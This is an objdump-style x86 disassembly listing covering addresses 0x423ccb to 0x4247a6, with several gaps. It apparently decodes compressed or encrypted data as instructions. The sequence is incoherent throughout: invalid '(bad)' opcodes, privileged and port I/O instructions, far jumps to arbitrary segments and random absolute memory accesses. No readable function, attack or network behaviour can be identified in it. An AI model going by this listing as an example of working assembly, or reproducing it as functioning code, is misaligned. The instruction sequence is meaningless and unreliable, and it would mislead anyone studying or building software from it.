  423ccb:	add    BYTE PTR [ebp-0x77f1f64e],dl
  423cd1:	lock sub eax,0xb1f454c3
  423cd7:	push   ebp
  423cd8:	cmp    esp,esp
  423cda:	and    eax,0xa256e0c7
  423cdf:	scas   al,BYTE PTR es:[edi]
  423ce0:	or     al,0x17
  423ce2:	push   eax
  423ce3:	les    ecx,FWORD PTR [ecx]
  423ce5:	addr16 popa 
  423ce7:	repz xor eax,0x8d8528c2
  423ced:	scas   eax,DWORD PTR es:[edi]
  423cee:	cmp    BYTE PTR [edi+ebx*8],al
  423cf1:	push   ebp
  423cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cf3:	xchg   ecx,eax
  423cf4:	or     esi,DWORD PTR [ebx]
  423cf6:	inc    ebp
  423cf7:	push   0xecc1f00e
  423cfc:	mov    ebx,DWORD PTR [ebp+edi*8+0x39ea6373]
  423d03:	jg     0x423ce8
  423d05:	imul   ecx,DWORD PTR [edi],0xe6934f73
  423d0b:	lds    ecx,FWORD PTR [ebx-0x55]
  423d0e:	data16 icebp 
  423d10:	jo     0x423ccb
  423d12:	js     0x423cb2
  423d14:	sub    DWORD PTR [ebx+edi*8-0x7c938f89],esp
  423d1b:	cmp    DWORD PTR [eax],ebp
  423d1d:	jecxz  0x423d62
  423d1f:	mov    ds:0x64333f1f,eax
  423d24:	(bad)  [edx+0x7235a9]
  423d2a:	test   eax,0xa4b4310f
  423d2f:	pop    esp
  423d30:	mov    DWORD PTR [edx],ecx
  423d32:	std    
  423d33:	dec    esi
  423d34:	xor    DWORD PTR [edi],ebx
  423d36:	ins    DWORD PTR es:[edi],dx
  423d37:	xor    DWORD PTR [ecx+esi*2-0x5b],esp
  423d3b:	sub    al,al
  423d3d:	jnp    0x423cd1
  423d3f:	stos   DWORD PTR es:[edi],eax
  423d40:	mov    ebx,0xa5c88c8e
  423d45:	cld    
  423d46:	xchg   esp,eax
  423d47:	and    edx,edx
  423d49:	mov    ecx,0x9757b192
  423d4e:	ret    
  423d4f:	js     0x423da0
  423d51:	sub    DWORD PTR [eax+0x417b40d],ecx
  423d57:	sbb    DWORD PTR [edx-0x6387576b],ebp
  423d5d:	or     ebx,DWORD PTR [ecx]
  423d5f:	js     0x423d53
  423d61:	outs   dx,DWORD PTR ds:[esi]
  423d62:	enter  0x742,0x51
  423d66:	retf   0x1888
  423d69:	stos   DWORD PTR es:[edi],eax
  423d6a:	add    eax,DWORD PTR [esi]
  423d6c:	add    cl,BYTE PTR [ebx]
  423d6e:	jl     0x423d8a
  423d70:	add    dl,cl
  423d72:	fsubr  QWORD PTR [edx+0x61b65386]
  423d78:	(bad)  
  423d7a:	xor    DWORD PTR [ebp+0x6e],0x5d
  423d7e:	pop    ebp
  423d7f:	rcl    cl,0xc6
  423d82:	lahf   
  423d83:	push   cs
  423d84:	xchg   edx,eax
  423d85:	xchg   ebx,eax
  423d86:	shl    DWORD PTR ds:0x4366fe19,1
  423d8c:	pop    es
  423d8d:	jns    0x423de6
  423d8f:	mov    ebx,0xe63084ea
  423d94:	xchg   ebx,eax
  423d95:	in     eax,dx
  423d96:	mov    eax,0x239310ae
  423d9b:	cmp    DWORD PTR [edx-0x58],edi
  423d9e:	sbb    ah,dl
  423da0:	cmp    edi,DWORD PTR [ebx+0x6d]
  423da3:	push   ebx
  423da4:	loop   0x423d91
  423da6:	dec    ebp
  423da7:	mov    ecx,0x44e9988c
  423dac:	or     edi,esp
  423dae:	ror    eax,0xb
  423db1:	lds    ebp,FWORD PTR ds:0x139b650c
  423db7:	pop    eax
  423db8:	cwde   
  423db9:	mov    bh,0xd6
  423dbb:	enter  0x482c,0xd1
  423dbf:	rcr    bh,1
  423dc1:	rol    BYTE PTR [eax],1
	...
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	icebp  
  423e41:	xchg   ebx,eax
  423e42:	in     eax,dx
  423e43:	jnp    0x423e91
  423e45:	jg     0x423e48
  423e47:	add    dh,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [ebx-0x3e],al
  423e4e:	lock sbb cl,BYTE PTR [ebp-0x6fe6a2f3]
  423e55:	push   0x120bc2e9
  423e5a:	push   eax
  423e5b:	sub    al,0x19
  423e5d:	cmp    DWORD PTR [edi+0x4],edx
  423e60:	push   ss
  423e61:	sti    
  423e62:	mov    esp,DWORD PTR [esi]
  423e64:	cmp    BYTE PTR [edx-0x5bfa15b7],dh
  423e6a:	push   0xffffffdb
  423e6c:	pop    ds
  423e6d:	into   
  423e6e:	adc    BYTE PTR ds:0xa538ff4d,dl
  423e74:	repz mov ecx,0x4a20e278
  423e7a:	mov    dh,0xdb
  423e7c:	mov    ecx,0x382721a3
  423e81:	scas   al,BYTE PTR es:[edi]
  423e82:	popa   
  423e83:	scas   eax,DWORD PTR es:[edi]
  423e84:	fst    QWORD PTR [edx+0x17]
  423e87:	stos   BYTE PTR es:[edi],al
  423e88:	pushf  
  423e89:	xchg   esi,eax
  423e8a:	mov    esp,0x37c55027
  423e8f:	jmp    0x423e94
  423e91:	mov    dl,0xdf
  423e93:	pop    es
  423e94:	xor    edx,DWORD PTR [edi-0x157a31e5]
  423e9a:	mov    ecx,0x993d4e8
  423e9f:	mov    cl,0xda
  423ea1:	test   DWORD PTR [edi-0x24],esp
  423ea4:	mul    DWORD PTR [ebx+0x22743652]
  423eaa:	ins    DWORD PTR es:[edi],dx
  423eab:	lds    ebx,FWORD PTR [esi+0x7ce4ac5e]
  423eb1:	lds    ecx,FWORD PTR [edx]
  423eb3:	sbb    BYTE PTR [esi-0x62078784],dl
  423eb9:	lock jmp 0x423ef3
  423ebc:	cs jnp 0x423e51
  423ebf:	jecxz  0x423ea1
  423ec1:	jne    0x423e4e
  423ec3:	aas    
  423ec4:	add    eax,0xc800d253
  423ec9:	int    0x32
  423ecb:	addr16 aaa 
  423ecd:	cmp    DWORD PTR [ecx+0x74adcbb2],esi
  423ed3:	or     DWORD PTR ss:[edi+ebp*4-0x45],eax
  423ed8:	je     0x423f21
  423eda:	loope  0x423f54
  423edc:	lock sar DWORD PTR [esi],0x3
  423ee0:	sahf   
  423ee1:	sar    BYTE PTR [edi+0x2a],0xe8
  423ee5:	loope  0x423f14
  423ee7:	mov    bl,ah
  423ee9:	xlat   BYTE PTR ds:[ebx]
  423eea:	mov    al,ds:0xd5935fc6
  423eef:	stos   BYTE PTR es:[edi],al
  423ef0:	or     BYTE PTR fs:[esi+0x72500ddd],dh
  423ef7:	jb     0x423f4b
  423ef9:	cmp    al,0x2a
  423efb:	push   ds
  423efc:	popf   
  423efd:	add    DWORD PTR [edx],edi
  423eff:	(bad)  
  423f00:	(bad)  
  423f01:	push   edx
  423f02:	outs   dx,BYTE PTR ds:[esi]
  423f03:	sub    esp,DWORD PTR [ecx+0x124d794]
  423f09:	push   esi
  423f0a:	mov    ?,WORD PTR [esi+ebp*8-0x29]
  423f0e:	outs   dx,BYTE PTR ds:[esi]
  423f0f:	and    BYTE PTR [ebx-0x6],al
  423f12:	fstp   QWORD PTR [eax-0x4e]
  423f15:	test   al,0x2d
  423f17:	xor    eax,0x96ab334d
  423f1c:	das    
  423f1d:	hlt    
  423f1e:	scas   eax,DWORD PTR es:[edi]
  423f1f:	jle    0x423ece
  423f21:	push   0x19fc1b67
  423f26:	test   eax,0x88a93bd3
  423f2b:	(bad)  
  423f2c:	retf   
  423f2d:	(bad)  
  423f2e:	mov    eax,ds:0x97cc1ed3
  423f33:	mov    edx,0xab62507a
  423f38:	xor    DWORD PTR [edi],0xffffffe1
  423f3b:	test   BYTE PTR [edi],ah
  423f3d:	add    ebx,DWORD PTR [eax]
  423f3f:	aaa    
  423f40:	adc    eax,0xdb
	...
  423fb1:	add    BYTE PTR [eax],al
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0x12],dh
  423fc1:	std    
  423fc2:	iret   
  423fc3:	fld    QWORD PTR [edx-0x80]
  423fc6:	add    DWORD PTR [eax],eax
  423fc8:	test   BYTE PTR [eax],0x0
  423fcb:	add    BYTE PTR [eax-0x3f],cl
  423fce:	xchg   edx,eax
  423fcf:	shl    dl,0x2a
  423fd2:	xchg   esp,eax
  423fd3:	pop    eax
  423fd4:	(bad)  [eax+eax*1+0x71345c5b]
  423fdb:	jecxz  0x424006
  423fdd:	pop    edi
  423fde:	push   edi
  423fdf:	cwde   
  423fe0:	icebp  
  423fe1:	ins    BYTE PTR es:[edi],dx
  423fe2:	dec    esi
  423fe3:	mov    ds:0x79beee16,eax
  423fe8:	jmp    0xd685:0xf72c50b9
  423fef:	fldcw  WORD PTR [ecx-0x229c1a9]
  423ff5:	lock mov dh,0xb6
  423ff8:	sbb    eax,0xdcffacde
  423ffd:	lock dec eax
  423fff:	scas   al,BYTE PTR es:[edi]
  424000:	pop    eax
  424001:	rol    BYTE PTR [eax-0x2b89a817],1
  424007:	add    DWORD PTR [ebx+0x1b],esi
  42400a:	adc    eax,0x6c9b7a9
  42400f:	add    eax,0xb47899fc
  424014:	retf   
  424015:	mov    bh,0xc3
  424017:	pop    edi
  424018:	push   es
  424019:	mov    ah,0x58
  42401b:	icebp  
  42401c:	out    dx,eax
  42401d:	adc    BYTE PTR [edx+0xc],bh
  424020:	scas   eax,DWORD PTR es:[edi]
  424021:	(bad)  
  424023:	or     eax,0x7d473e10
  424028:	rol    BYTE PTR [edi],0x29
  42402b:	out    dx,eax
  42402c:	push   ss
  42402d:	sbb    bl,BYTE PTR [ecx]
  42402f:	cmp    cl,BYTE PTR [edi]
  424031:	add    eax,0x67c29f3a
  424036:	or     BYTE PTR [esi],cl
  424038:	mov    al,ds:0xabcf1317
  42403d:	call   DWORD PTR [esi]
  42403f:	pop    esp
  424040:	cmp    ebp,DWORD PTR [edx]
  424042:	push   edi
  424043:	cmp    DWORD PTR [esi],edi
  424045:	loop   0x423fd3
  424047:	xchg   ecx,eax
  424048:	and    bh,al
  42404a:	cmp    eax,0xd3355890
  42404f:	fstp   TBYTE PTR [edi+ebx*4+0x670060ba]
  424056:	aas    
  424057:	sub    bl,ah
  424059:	xchg   BYTE PTR [eax+0x57c4aa05],bh
  42405f:	test   eax,0xf0c985bf
  424064:	mov    al,ds:0x668df6af
  424069:	enter  0x91ff,0xa0
  42406d:	push   ebx
  42406e:	or     al,0xdd
  424070:	xacquire xchg DWORD PTR [esi+0x6],eax
  424074:	cdq    
  424075:	scas   eax,DWORD PTR es:[edi]
  424076:	xchg   esp,eax
  424077:	cmp    eax,0xbc46362a
  42407c:	dec    ebx
  42407d:	fisubr WORD PTR [esi]
  42407f:	(bad)  
  424080:	daa    
  424081:	add    eax,DWORD PTR [ebx-0x2c856f37]
  424087:	xchg   ebp,eax
  424088:	mov    bl,0xa7
  42408a:	jecxz  0x4240bc
  42408c:	fucomp st(2)
  42408e:	mov    ecx,DWORD PTR [edx-0x783f3137]
  424094:	add    dh,BYTE PTR [edi]
  424096:	je     0x424058
  424098:	in     eax,0x83
  42409a:	pusha  
  42409b:	mov    al,ds:0x791922c6
  4240a0:	xchg   ebx,eax
  4240a1:	mov    ds:0xfb8adefe,eax
  4240a6:	outs   dx,DWORD PTR ds:[esi]
  4240a7:	fwait
  4240a8:	ds loop 0x4240b6
  4240ab:	outs   dx,BYTE PTR ds:[esi]
  4240ac:	cs inc esi
  4240ae:	sbb    dh,BYTE PTR [ebp-0x50]
  4240b1:	sbb    esi,DWORD PTR [edi]
  4240b3:	push   esp
  4240b4:	pop    ebx
  4240b5:	mov    cl,0x4e
  4240b7:	and    edx,DWORD PTR [esi-0x57]
  4240ba:	jp     0x42409a
  4240bc:	lods   al,BYTE PTR ds:[esi]
  4240bd:	fstp   DWORD PTR [edx]
  4240bf:	cdq    
  4240c0:	fld    DWORD PTR [eax]
	...
  424132:	add    BYTE PTR [eax],al
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x181f8496]
  424142:	xor    eax,0x18138e5
  424147:	add    dh,dh
  424149:	add    BYTE PTR [eax],al
  42414b:	add    BYTE PTR [esi+0x11197c0d],dl
  424151:	adc    eax,0x7b23f8c2
  424156:	xor    esi,DWORD PTR [eax]
  424158:	add    DWORD PTR [ebp+0x5e],esi
  42415b:	inc    ebx
  42415c:	test   al,0x44
  42415e:	arpl   WORD PTR [edx-0x7e88b4d1],cx
  424164:	(bad)  
  424165:	std    
  424166:	jbe    0x4240fc
  424168:	add    ebp,DWORD PTR [esi]
  42416a:	test   BYTE PTR [edi+0x66],al
  42416d:	pop    edx
  42416e:	cmp    ah,BYTE PTR [esi]
  424170:	pop    esp
  424172:	mov    ebx,0x1a720d09
  424177:	loopne 0x4241b2
  424179:	inc    ebx
  42417a:	aad    0x8c
  42417c:	loope  0x4241e5
  42417e:	je     0x42418a
  424180:	jae    0x424176
  424182:	jns    0x42415e
  424184:	cmp    DWORD PTR [ecx],ecx
  424186:	mov    ah,0xad
  424188:	bndstx [eax+0x66653f53],(bad)
  42418f:	adc    edi,DWORD PTR [ebx-0x6074d932]
  424195:	push   eax
  424196:	iret   
  424197:	mov    fs,WORD PTR [ebp-0x32d13a04]
  42419d:	out    0xa0,al
  42419f:	repnz add DWORD PTR [ebp-0x41],0x64e3068d
  4241a7:	fnstsw WORD PTR [edi]
  4241a9:	(bad)  
  4241aa:	adc    DWORD PTR [eax-0x5e834973],ecx
  4241b0:	xor    DWORD PTR [ebp-0x36],eax
  4241b3:	sbb    BYTE PTR [eax+0x56],0x4f
  4241b7:	ja     0x424209
  4241b9:	inc    ebp
  4241ba:	fwait
  4241bb:	stos   DWORD PTR es:[edi],eax
  4241bc:	cli    
  4241bd:	adc    eax,0x51a1b13e
  4241c2:	outs   dx,BYTE PTR ds:[esi]
  4241c3:	push   ecx
  4241c4:	dec    edx
  4241c5:	cli    
  4241c6:	scas   al,BYTE PTR es:[edi]
  4241c7:	pop    edx
  4241c8:	stc    
  4241c9:	mov    eax,ds:0x3f813afd
  4241ce:	repnz frstor [ebp+0x12e6b3f3]
  4241d5:	cmp    bh,al
  4241d7:	daa    
  4241d8:	jno    0x4241c1
  4241da:	dec    edi
  4241db:	fstp   st(1)
  4241dd:	rcl    BYTE PTR [ebp+0x5f],1
  4241e0:	dec    edi
  4241e1:	cs (bad) 
  4241e3:	xor    eax,0x46ff0569
  4241e8:	imul   al
  4241ea:	cmp    eax,DWORD PTR [esi-0x69]
  4241ed:	les    edi,FWORD PTR [edi-0x167c74]
  4241f3:	inc    esp
  4241f4:	push   ds
  4241f5:	xor    al,0xf
  4241f7:	test   eax,0x7efc910d
  4241fc:	jo     0x424238
  4241fe:	add    al,BYTE PTR [esi]
  424200:	fnstsw WORD PTR [ecx]
  424202:	in     eax,0x23
  424204:	aas    
  424205:	leave  
  424206:	loop   0x4241b5
  424208:	call   0xce5a:0xf7bdf077
  42420f:	push   edi
  424210:	pop    edx
  424211:	test   DWORD PTR [eax+0x5a6c55cd],eax
  424217:	call   0xa4f7239b
  42421c:	mov    edx,0x69fdc78f
  424221:	mov    bl,0x23
  424223:	(bad)  
  424224:	sub    BYTE PTR [esi+0x12bd278a],bh
  42422a:	mov    esi,0x848856d1
  42422f:	or     dl,al
  424231:	sub    dl,al
  424233:	mov    ah,BYTE PTR [edx+0x78]
  424236:	push   cs
  424237:	pop    ds
  424238:	xlat   BYTE PTR ds:[ebx]
  424239:	add    ecx,eax
  42423b:	shl    DWORD PTR [esi],1
  42423d:	in     eax,dx
  42423e:	add    edi,ecx
  424240:	mov    ecx,DWORD PTR [eax+0x0]
	...
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x3e69a4bf,eax
  4242c2:	das    
  4242c3:	jae    0x4242f3
  4242c5:	add    BYTE PTR [ecx],0x0
  4242c8:	test   BYTE PTR [eax],0x0
  4242cb:	add    BYTE PTR ds:0x9ad6c79,bh
  4242d1:	pop    eax
  4242d2:	iret   
  4242d3:	cmp    ch,bl
  4242d5:	jb     0x42430c
  4242d7:	xor    eax,0x9d83088f
  4242dc:	add    esp,ecx
  4242de:	pop    edi
  4242df:	aam    0x9b
  4242e1:	ret    0x338f
  4242e4:	sahf   
  4242e5:	cmp    al,0xfb
  4242e7:	inc    ecx
  4242e8:	push   esp
  4242e9:	mov    esi,ebx
  4242eb:	mov    edx,ebx
  4242ed:	arpl   WORD PTR [ebp+0x44],ax
  4242f0:	inc    eax
  4242f1:	aad    0x50
  4242f3:	outs   dx,BYTE PTR ds:[esi]
  4242f4:	xchg   ebx,eax
  4242f5:	cmp    dl,BYTE PTR [esi]
  4242f7:	adc    ch,BYTE PTR [edi+ebx*4]
  4242fa:	mov    ah,0x79
  4242fc:	pop    esp
  4242fd:	repnz fwait
  4242ff:	test   DWORD PTR [edx+esi*2+0x2d6faa03],ebp
  424306:	scas   al,BYTE PTR es:[edi]
  424307:	lahf   
  424308:	stos   BYTE PTR es:[edi],al
  424309:	mov    dh,0x39
  42430b:	ret    0x6136
  42430e:	cmp    BYTE PTR [esi],0x95
  424311:	inc    ebp
  424312:	sub    ebp,DWORD PTR [ebp+0x58]
  424315:	cmp    DWORD PTR [ecx-0x7f85ba2f],0x989b8ea9
  42431f:	jmp    0xb23ac2b3
  424324:	ins    DWORD PTR es:[edi],dx
  424325:	jge    0x4242f8
  424327:	(bad)  
  424329:	push   es
  42432a:	jns    0x424365
  42432c:	and    al,0x62
  42432e:	fs mov esi,0x3f8fc5ad
  424334:	push   edx
  424335:	jno    0x424387
  424337:	clc    
  424338:	xor    DWORD PTR [edx-0x29],ebp
  42433b:	mov    al,ss:0x1c5ec892
  424341:	rcl    esp,cl
  424343:	loop   0x424340
  424345:	out    dx,al
  424346:	pop    ebx
  424347:	dec    ecx
  424348:	cli    
  424349:	mov    ebx,0x5dd8812
  42434e:	ss xchg edx,eax
  424350:	js     0x424368
  424352:	test   ah,0x37
  424355:	loope  0x42432f
  424357:	push   esi
  424358:	int    0x2d
  42435a:	mov    WORD PTR [ebx+0x4f],?
  42435d:	fsubr  QWORD PTR [eax+0x79cd8515]
  424363:	sub    bh,BYTE PTR [ebx+0x39]
  424366:	stos   BYTE PTR es:[edi],al
  424367:	or     eax,0x53c85a86
  42436c:	mov    cl,0x72
  42436e:	aas    
  42436f:	mov    bl,0xe0
  424371:	adc    ecx,edi
  424373:	or     bh,dl
  424375:	mov    al,0x82
  424377:	mov    edx,ecx
  424379:	aas    
  42437a:	lods   al,BYTE PTR ds:[esi]
  42437b:	pop    es
  42437c:	sub    eax,0x208bb255
  424381:	(bad)  
  424383:	push   eax
  424384:	icebp  
  424385:	cmp    BYTE PTR [eax],0x37
  424388:	fs js  0x4243e8
  42438b:	xchg   ebx,eax
  42438c:	sub    ebp,0x9e60f148
  424392:	mov    dh,0xf7
  424394:	push   ecx
  424395:	cld    
  424396:	imul   edi,DWORD PTR [edx],0xffffffc8
  424399:	sub    eax,edx
  42439b:	mov    ch,0x72
  42439d:	into   
  42439e:	fwait
  42439f:	dec    esp
  4243a0:	ins    BYTE PTR es:[edi],dx
  4243a1:	fcomip st,st(7)
  4243a3:	xor    al,0xcf
  4243a5:	and    BYTE PTR [eax],al
  4243a7:	sbb    eax,esp
  4243a9:	mov    edi,0xffa04de4
  4243ae:	pop    ebp
  4243af:	mov    ss,WORD PTR [edi-0x27]
  4243b2:	aam    0xf
  4243b4:	repz xchg ebp,eax
  4243b6:	aam    0x6e
  4243b8:	jmp    0x38a6:0x7c72fb66
  4243bf:	scas   al,BYTE PTR es:[edi]
  4243c0:	pushf  
  4243c1:	fadd   QWORD PTR [eax]
	...
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0x76d2:0x8abb70bf
  424441:	sbb    eax,0x83242db9
  424446:	add    DWORD PTR [eax],eax
  424448:	test   BYTE PTR [eax],0x0
  42444b:	add    BYTE PTR [esi],bl
  42444d:	mov    esi,0xdfd6b961
  424452:	mov    ebx,DWORD PTR [esi+edi*1+0x77231923]
  424459:	inc    esi
  42445a:	jns    0x4244a7
  42445c:	pop    ss
  42445d:	push   ecx
  42445e:	dec    esi
  42445f:	(bad)  
  424460:	or     ah,dh
  424462:	or     al,0xd9
  424464:	or     al,0x9a
  424466:	jl     0x424451
  424468:	cs stc 
  42446a:	xchg   ebp,eax
  42446b:	in     eax,dx
  42446c:	sbb    BYTE PTR [ebp-0x6b],dh
  42446f:	popf   
  424470:	mov    al,ds:0xea326bf2
  424475:	dec    esi
  424476:	or     BYTE PTR [eax+ebp*2],al
  424479:	test   DWORD PTR [ebx-0x77],ecx
  42447c:	imul   esp,eax,0xffffff9a
  42447f:	xor    al,0x15
  424481:	call   0x48af9a07
  424486:	sbb    edx,DWORD PTR ds:0x824b1623
  42448c:	sahf   
  42448d:	lds    esp,FWORD PTR [esp+esi*4-0x59]
  424491:	ret    
  424492:	mov    esp,edi
  424494:	inc    ebx
  424495:	dec    edx
  424496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424497:	es (bad) 
  424499:	cmc    
  42449a:	xchg   esi,eax
  42449b:	rol    BYTE PTR [edx],0x37
  42449e:	mov    ds:0xac6377ea,eax
  4244a3:	shr    BYTE PTR [edx+0x5a],0xe4
  4244a7:	push   eax
  4244a8:	aas    
  4244a9:	mov    cl,0x9b
  4244ab:	mov    ecx,ds
  4244ad:	push   edx
  4244ae:	xchg   esi,eax
  4244af:	pop    ebp
  4244b0:	pop    ss
  4244b1:	inc    ebp
  4244b2:	sub    esi,esp
  4244b4:	pop    ss
  4244b5:	jle    0x4244fe
  4244b7:	mov    esi,0x2c98b21b
  4244bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244bd:	mov    ch,0x5a
  4244bf:	cmp    al,0x3f
  4244c1:	pop    ebx
  4244c2:	inc    esp
  4244c3:	test   BYTE PTR [ecx],0x91
  4244c6:	lds    ecx,FWORD PTR [ebx-0x38cd1e92]
  4244cc:	jecxz  0x424532
  4244ce:	pop    edx
  4244cf:	add    DWORD PTR [eax+0x3aa5602c],edx
  4244d5:	popf   
  4244d6:	mov    WORD PTR [edi+0x76c4d0fd],ds
  4244dc:	les    ebx,FWORD PTR [ecx]
  4244de:	(bad)  
  4244df:	xor    al,0x9d
  4244e1:	cdq    
  4244e2:	push   ecx
  4244e3:	(bad)  
  4244e4:	sbb    edi,DWORD PTR [eax]
  4244e6:	add    dh,ch
  4244e8:	sbb    al,0x14
  4244ea:	bound  esi,QWORD PTR [ebx]
  4244ec:	jle    0x42449c
  4244ee:	adc    al,0x4
  4244f0:	(bad)  
  4244f1:	rcr    BYTE PTR [edx+0x52bd9b79],0xb3
  4244f8:	test   BYTE PTR [eax+0x43],dl
  4244fb:	outs   dx,BYTE PTR ds:[esi]
  4244fc:	fsubrp st(5),st
  4244fe:	bound  eax,QWORD PTR [esp+esi*2+0x6b9f45df]
  424505:	xchg   edx,eax
  424506:	sub    DWORD PTR [esi+eiz*4-0x5a2ed76a],ebx
  42450d:	and    eax,0x806221e4
  424512:	jmp    0x8b037d68
  424517:	cmp    eax,0x3385b3e1
  42451c:	sbb    al,0x3
  42451e:	fild   QWORD PTR [edi]
  424520:	icebp  
  424521:	outs   dx,BYTE PTR ds:[esi]
  424522:	sub    DWORD PTR [esi],esp
  424524:	out    0xdc,eax
  424526:	mov    cl,0xe6
  424528:	(bad)  
  42452a:	fs jbe 0x4244f9
  42452d:	add    ecx,DWORD PTR [ecx-0x71]
  424530:	mov    ss,edi
  424532:	jns    0x424564
  424534:	outs   dx,DWORD PTR ds:[esi]
  424535:	pop    edx
  424536:	mov    al,ds:0xa373a919
  42453b:	xchg   DWORD PTR [eax+0x3db4cdae],ecx
  424541:	jmp    0x424546
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    DWORD PTR [edx],edx
  4245c1:	mov    dl,0xcc
  4245c3:	das    
  4245c4:	sbb    al,BYTE PTR [ecx+eax*1+0xf600]
  4245cb:	add    BYTE PTR [ecx+0x2a],dh
  4245ce:	or     al,0xd9
  4245d0:	(bad)  
  4245d1:	mov    ds:0x98497827,eax
  4245d6:	adc    BYTE PTR [ebx+0x27acfbe9],ah
  4245dc:	push   ebp
  4245dd:	push   edi
  4245de:	ins    BYTE PTR es:[edi],dx
  4245df:	inc    edi
  4245e0:	imul   DWORD PTR [edx]
  4245e2:	mov    WORD PTR [esi-0x10],ss
  4245e5:	rcl    ebp,cl
  4245e7:	fcomip st,st(2)
  4245e9:	lea    ebp,[ebp+0x5]
  4245ec:	xchg   edx,eax
  4245ed:	iret   
  4245ee:	xchg   BYTE PTR [esi],bh
  4245f0:	and    esi,esp
  4245f2:	cwde   
  4245f3:	cmp    edi,esi
  4245f5:	nop
  4245f6:	mov    al,ds:0x160988d9
  4245fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245fc:	je     0x424649
  4245fe:	pop    ecx
  4245ff:	sbb    al,0xb9
  424601:	xor    BYTE PTR [eax-0x2aa15875],dh
  424607:	mov    eax,0xf0a39099
  42460c:	fld    QWORD PTR [edx-0x128ae6eb]
  424612:	mov    ecx,0x89123f41
  424617:	cmc    
  424618:	repz or al,bh
  42461b:	sub    eax,0x78f0962c
  424620:	scas   al,BYTE PTR es:[edi]
  424621:	adc    al,0x2a
  424623:	mov    ds:0x8dbd2a11,al
  424628:	adc    esp,DWORD PTR [esi+0x7]
  42462b:	dec    esi
  42462c:	or     esp,ecx
  42462e:	jb     0x42465d
  424630:	and    bh,BYTE PTR [edi-0x70c46d1b]
  424636:	pop    esi
  424637:	sbb    BYTE PTR [edx+ecx*1],dh
  42463a:	push   ds
  42463b:	mov    dl,BYTE PTR [ecx-0x7bdb09d4]
  424641:	or     DWORD PTR [ecx-0x3c],0x7c
  424645:	add    DWORD PTR [eax+eiz*2],eax
  424648:	xor    BYTE PTR [ebx],0xa5
  42464b:	into   
  42464c:	out    dx,al
  42464d:	push   ebp
  42464e:	sti    
  42464f:	jbe    0x4245fe
  424651:	adc    BYTE PTR [ecx-0x6f],cl
  424654:	and    BYTE PTR [edx-0x26e2dad7],bl
  42465a:	out    0x45,al
  42465c:	jmp    0x4245e3
  42465e:	hlt    
  42465f:	mov    ds:0x30e28165,al
  424664:	(bad)  
  424665:	xchg   esp,eax
  424666:	push   ebx
  424667:	sbb    eax,0x483236e2
  42466c:	jnp    0x42467e
  42466e:	cld    
  42466f:	(bad)  
  424670:	repnz fnstenv [ebx]
  424673:	add    DWORD PTR [esi+0x25],esp
  424676:	mov    edx,0xea6047a8
  42467b:	iret   
  42467c:	es in  al,0x75
  42467f:	sub    DWORD PTR [di],esp
  424682:	or     al,0xa
  424684:	sub    eax,0xc8f4610c
  424689:	dec    ebp
  42468a:	repnz adc eax,0x5351cc40
  424690:	scas   eax,DWORD PTR es:[edi]
  424691:	rcl    DWORD PTR [edi-0x1c],0x3c
  424695:	into   
  424696:	add    BYTE PTR ds:0x821447b0,bl
  42469c:	add    DWORD PTR [ebx-0x1951d733],ebp
  4246a2:	test   BYTE PTR cs:[ebp-0x26272d67],dl
  4246a9:	add    ebp,DWORD PTR [ecx-0x641d1796]
  4246af:	scas   eax,DWORD PTR es:[edi]
  4246b0:	aad    0x63
  4246b2:	fmul   QWORD PTR [edi+0x42]
  4246b5:	ja     0x42472b
  4246b7:	jnp    0x424729
  4246b9:	mov    ebp,0x776b14aa
  4246be:	in     eax,0xc6
  4246c0:	cmp    BYTE PTR [eax+0x0],cl
	...
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fst    QWORD PTR [edi-0x9]
  424742:	out    dx,al
  424743:	test   eax,0x18510
  424748:	test   BYTE PTR [eax],0x0
  42474b:	add    bh,cl
  42474d:	outs   dx,DWORD PTR ds:[esi]
  42474e:	dec    edx
  42474f:	mov    al,0x3b
  424751:	fsubr  st,st(5)
  424753:	sar    DWORD PTR [edi+esi*2],cl
  424756:	and    DWORD PTR [ebx-0x13],eax
  424759:	ds das 
  42475b:	pop    ds
  42475c:	and    dh,BYTE PTR [esi+0x163bc1e4]
  424762:	dec    edx
  424763:	ret    0xea98
  424766:	push   ebp
  424767:	dec    ebx
  424768:	shr    DWORD PTR [ecx],0x20
  42476b:	cs cmp eax,0x270351cc
  424771:	lahf   
  424772:	dec    eax
  424773:	jmp    0x9617:0x6cb9079
  42477a:	pop    eax
  42477b:	pop    ss
  42477c:	dec    edi
  42477d:	xor    DWORD PTR [ebx+0x23],esp
  424780:	jmp    0xc76d00fa
  424785:	in     eax,dx
  424786:	mov    esp,DWORD PTR [ebx]
  424788:	sahf   
  424789:	mov    edi,0x32cacff9
  42478e:	adc    DWORD PTR [ebx-0x2e6ccaa7],0xffffffac
  424795:	jno    0x424788
  424797:	cs popa 
  424799:	cmp    DWORD PTR [esp+esi*4+0x11],eax
  42479d:	into   
  42479e:	repz or ah,al
  4247a1:	pushf  
  4247a2:	push   edx
  4247a3:	push   0x16
  4247a5:	pop    esi
  4247a6:	mov    dh,0x14
